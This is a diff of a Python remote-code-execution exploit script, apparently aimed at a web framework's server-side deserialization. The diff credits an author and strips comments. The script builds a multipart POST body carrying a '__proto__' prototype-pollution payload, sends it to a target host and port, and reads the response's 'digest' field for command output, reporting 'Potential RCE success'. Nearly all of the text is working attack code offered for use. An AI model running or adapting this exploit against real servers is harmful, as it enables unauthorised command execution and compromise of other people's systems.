@@ -1,3 +1,4 @@
+#Script by LunchM0n3y
 #!/usr/bin/env python3
 import argparse
 import requests
@@ -7,7 +8,7 @@ import re
 def send_exploit(host, port, payload, timeout=10):
     url = f"http://{host}:{port}/"
     
-    # Build part0 dict
+    
     part0_dict = {
         "then": "$1:__proto__:then",
         "status": "resolved_model",
@@ -22,10 +23,9 @@ def send_exploit(host, port, payload, timeout=10):
         }
     }
     
-    # Pretty-print JSON with indent=2 to match original formatting
+    
     part0_json = json.dumps(part0_dict, indent=2)
     
-    # Manual multipart body construction with exact \r\n line endings
     boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
     body = f"""------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
 Content-Disposition: form-data; name="0"\r
@@ -63,7 +63,7 @@ Content-Disposition: form-data; name="2"\r
         response = requests.post(url, data=body, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
         print(f"[+] Response Status: {response.status_code}")
         print(f"[+] Response Headers: {dict(response.headers)}")
-        print(f"[+] Response Body: {response.text[:500]}...")  # Truncate for readability
+        print(f"[+] Response Body: {response.text[:500]}...")  
         # Look for 'digest' in body for command output
         if 'digest' in response.text.lower():
             print("[+] Potential RCE success! Check 'digest' for output (e.g., username).")
